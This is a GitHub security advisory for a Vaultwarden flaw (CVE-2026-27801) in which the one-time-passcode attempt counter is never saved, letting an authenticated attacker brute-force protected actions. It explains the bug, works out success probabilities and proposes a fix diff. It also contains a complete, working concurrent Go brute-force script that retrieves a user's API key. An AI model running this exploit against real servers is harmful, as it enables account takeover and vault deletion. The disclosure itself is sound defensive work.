# [M] Vaultwarden has 2FA Bypass on Protected Actions due to Faulty Rate Limit Enforcement

## Summary
Severity: Medium
Advisory: GHSA-v6pg-v89r-w8wr
CVE: CVE-2026-27801
CWE: CWE-307
Ecosystem: crates.io
CVSS: CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-04
Source: https://github.com/advisories/GHSA-v6pg-v89r-w8wr
Type: github-advisory

## Affected
- crates.io: `vaultwarden` — affected >=0 <1.35.0

## Details
### Summary

Vaultwarden v1.34.3 and prior are susceptible to a 2FA bypass when performing protected actions. An attacker who gains authenticated access to a user&rsquo;s account can exploit this bypass to perform protected actions such as accessing the user's API key or deleting the user's vault and organisations the user is an admin/owner of.

Note that 


### Details

Within Vaultwarden, the `PasswordOrOtpData` struct is used to gate certain protected actions such as account deletion behind a 2FA validation. This validation requires the user to either re-enter their master password, or to enter a one-time passcode sent to their email address.

By default, the one-time passcode is comprised of six digits, and the expiry time for each token is ten minutes. The validation of this one-time passcode is performed by the following function:

```rust
pub async fn validate_protected_action_otp(
    otp: &str,
    user_id: &UserId,
    delete_if_valid: bool,
    conn: &mut DbConn,
) -> EmptyResult {
    let pa = TwoFactor::find_by_user_and_type(user_id, TwoFactorType::ProtectedActions as i32, conn)
        .await
        .map_res("Protected action token not found, try sending the code again or restart the process")?;
    let mut pa_data = ProtectedActionData::from_json(&pa.data)?;

    pa_data.add_attempt();
    // Delete the token after x attempts if it has been used too many times
    // We use the 6, which should be more then enough for invalid attempts and multiple valid checks
    if pa_data.attempts > 6 {
        pa.delete(conn).await?;
        err!("Token has expired")
    }

    // Check if the token has expired (Using the email 2fa expiration time)
    let date =
        DateTime::from_timestamp(pa_data.token_sent, 0).expect("Protected Action token timestamp invalid.").naive_utc();
    let max_time = CONFIG.email_expiration_time() as i64;
    if date + TimeDelta::try_seconds(max_time).unwrap() < Utc::now().naive_utc() {
        pa.delete(conn).await?;
        err!("Token has expired")
    }

    if !crypto::ct_eq(&pa_data.token, otp) {
        pa.save(conn).await?;
        err!("Token is invalid")
    }

    if delete_if_valid {
        pa.delete(conn).await?;
    }

    Ok(())
}
```

Since the one-time passcode is only six-digits long, it has significantly less entropy than a typical password or secret key. Hence, Vaultwarden attempts to prevent brute-force attacks against this passcode by enforcing a rate limit of 6 attempts per code. However, the number of attempts made by the user is not persisted correctly.

In the `validate_protected_action_top` function, Vaultwarden first reads the OTP data from a JSON blob stored in `pa.data`. The resulting `ProtectedActionData` structure is then a deserialised copy of the underlying JSON value.

```rust
let mut pa_data = ProtectedActionData::from_json(&pa.data)?;
```

Next, Vaultwarden calls `pa_data.add_attempt()` in order to increment the number of attempts made by one. This increments the attempt count on the local structure, but does not modify the value of the `pa.data`.

```rust
pub fn add_attempt(&mut self) {
    self.attempts += 1;
}
```

Finally, if the OTP validation fails, Vaultwarden attempts to persist the updated attempt count by calling `pa.save(conn)`. However since we only modified a copy of `pa.data`, the value of `pa.data.attempts` remains at zero.

The probability of a successful brute force depends on the OTP token length, the OTP expiry duration, and the request throughput. Since each request issued by the attacker does not depend on any previous requests, network latency is not a factor. The bottleneck then, will likely be either the attacker&rsquo;s network bandwidth or Vaultwarden&rsquo;s request processing throughput. From local testing, rates of up to 2500 requests per second were achievable, which successfuly bruteforced the OTP in 3 minutes.

If the attacker&rsquo;s request throughput is low, they can also make repeated requests to `/api/accounts/request-otp` to generate new tokens. Their probability of success is then

```math
1 - \left(1 - \frac{R * T}{10^L}\right)^n,
```

where $R$ is the number of requests per second, $T$ is the token expiry time in seconds, $L$ is the number of digits in the OTP code, and $n$ is the number of OTP tokens requested.


<a id="orgca0bfe5"></a>

### Proof of Concept

The easiest method of demonstrating this vulnerability is by making an (authenticated) request to the `/api/accounts/request-otp` endpoint to generate an OTP, and then repeatedly sending invalid guesses to `/api/accounts/verify-otp`. After six guesses, Vaultwarden will still reply `"Token is invalid"` in response to an incorrect guess, rather than `"Token has expired"` as expected when the rate limit is exceeded. Upon entering the correct OTP, the code will still validate despite more than six guesses being made.

For a more practical example, the following Go script will brute force the OTP in order to read the user&rsquo;s API key.

```go
package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"sync"
	"sync/atomic"
	"time"
)

const (
	host        = "https://10.10.0.1:8000"
	jwtToken    = "..."
	concurrency = 100
	totalOtps   = 1000000
)

type Brute struct {
	client *http.Client
}

func NewBrute() *Brute {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	return &Brute{
		client: &http.Client{Transport: tr},
	}
}

func (v *Brute) RequestOTP() error {
	req, err := http.NewRequest("POST", host+"/api/accounts/request-otp", nil)
	if err != nil {
		return fmt.Errorf("failed to create OTP request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+jwtToken)

	resp, err := v.client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send OTP request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusBadRequest {
		return fmt.Errorf("unexpected status code for OTP request: %d", resp.StatusCode)
	}

	fmt.Println("Requested OTP successfully")
	return nil
}

func (v *Brute) GetAPIKey(ctx context.Context, otp string) (bool, error) {
	payload, _ := json.Marshal(map[string]string{"otp": otp})
	body := bytes.NewBuffer(payload)

	req, err := http.NewRequestWithContext(ctx, "POST", host+"/api/accounts/api-key", body)
	if err != nil {
		return false, fmt.Errorf("failed to create verification request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+jwtToken)
	req.Header.Set("Content-Type", "application/json")

	resp, err := v.client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	switch resp.StatusCode {
	case http.StatusOK:
		body, err := io.ReadAll(resp.Body)
		if err == nil {
			fmt.Println("\n-----\n" + string(body) + "\n-----\n")
		}
		return true, nil
	case http.StatusBadRequest:
		return false, nil
	default:
		return false, fmt.Errorf("unexpected status code for verification: %d", resp.StatusCode)
	}
}

func progressTracker(ctx context.Context, counter *uint64, start time.Time) {
	ticker := time.NewTicker(300 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			done := atomic.LoadUint64(counter)
			elapsed := time.Since(start).Seconds()
			rps := 0.0
			if elapsed > 0 {
				rps = float64(done) / elapsed
			}
			fmt.Printf("\rprogress: %d/%d (%.2f%%) | %.2f req/sec | elapsed: %.1fs\n", done, totalOtps, float64(done)/float64(totalOtps)*100, rps, elapsed)
			return
		case <-ticker.C:
			done := atomic.LoadUint64(counter)
			elapsed := time.Since(start).Seconds()
			rps := 0.0
			if elapsed > 0 {
				rps = float64(done) / elapsed
			}
			fmt.Printf("\rprogress: %d/%d (%.2f%%) | %.2f req/sec | elapsed: %.1fs", done, totalOtps, float64(done)/float64(totalOtps)*100, rps, elapsed)
		}
	}
}

func main() {
	brute := NewBrute()
	if err := brute.RequestOTP(); err != nil {
		log.Fatalf("Error: %v", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	var wg sync.WaitGroup
	var counter uint64
	startTime := time.Now()

	go progressTracker(ctx, &counter, startTime)

	chunkSize := totalOtps / concurrency
	for i := 0; i < concurrency; i++ {
		start := i * chunkSize
		end := start + chunkSize
		if i == concurrency-1 {
			end = totalOtps
		}

		wg.Add(1)
		go func(s, e int) {
			defer wg.Done()
			for otpNum := s; otpNum < e; otpNum++ {
				select {
				case <-ctx.Done():
					return
				default:
				}

				otpStr := fmt.Sprintf("%06d", otpNum)
				success, err := brute.GetAPIKey(ctx, otpStr)

				atomic.AddUint64(&counter, 1)

				if err != nil {
					select {
					case <-ctx.Done():
					default:
						log.Printf("\nError verifying OTP %s: %v", otpStr, err)
						cancel()
					}
					return
				}

				if success {
					fmt.Printf("\n\nSuccess: Found OTP = %s\n", otpStr)
					cancel()
					return
				}
			}
		}(start, end)
	}

	wg.Wait()
	fmt.Println("Brute-force attempt finished.")
}
```
<img width="997" height="301" alt="image" src="https://github.com/user-attachments/assets/61486bb6-302b-4edb-87b7-d229bbd33380" />

### Impact

An attacker who gains access to a user&rsquo;s account can exploit this bypass to perform protected actions such as accessing the user&rsquo;s API key or deleting the user&rsquo;s accounts and organisations.

### Remediation

The simplest fix is to ensure the updated number of attempts is persisted by calling `pa.data = pa_data.to_json()` before calling `pa.save(conn)`. However this still leaves open the possibility of an attacker requesting an OTP code, exhausting their six attempts and then requesting a new code to try. This attack succeeds with probability

```math
1 - \left(1 - \frac{6}{10^L}\right)^n,
```

which becomes non-neglible as $n$ increases.

Therefore the best approach might be to enforce a delay like this, to ensure that all rate limits are ultimately tied back to time:

```diff
diff --git a/src/api/core/two_factor/protected_actions.rs b/src/api/core/two_factor/protected_actions.rs
index 5e4a65be..aa9cb8f6 100644
--- a/src/api/core/two_factor/protected_actions.rs
+++ b/src/api/core/two_factor/protected_actions.rs
@@ -66,7 +66,18 @@ async fn request_otp(headers: Headers, mut conn: DbConn) -> EmptyResult {
     if let Some(pa) =
         TwoFactor::find_by_user_and_type(&user.uuid, TwoFactorType::ProtectedActions as i32, &mut conn).await
     {
-        pa.delete(&mut conn).await?;
+        let pa_data = ProtectedActionData::from_json(&pa.data)?;
+        let token_sent = DateTime::from_timestamp(pa_data.token_sent, 0)
+            .expect("Protected Action token timestamp invalid")
+            .naive_utc();
+        let elapsed = Utc::now().naive_utc() - token_sent;
+        let delay = TimeDelta::seconds(20);
+
+        if elapsed < delay {
+            err!(format!("Please wait {} seconds before requesting another code.", (delay - elapsed).num_seconds()));
+        } else {
+            pa.delete(&mut conn).await?;
+        }
     }

     let generated_token = crypto::generate_email_token(CONFIG.email_token_size());
@@ -131,6 +142,7 @@ pub async fn validate_protected_action_otp(
     }

     if !crypto::ct_eq(&pa_data.token, otp) {
+        pa.data = pa_data.to_json();
         pa.save(conn).await?;
         err!("Token is invalid")
     }
```

## References
- https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-v6pg-v89r-w8wr
- https://nvd.nist.gov/vuln/detail/CVE-2026-27801
- https://github.com/dani-garcia/vaultwarden
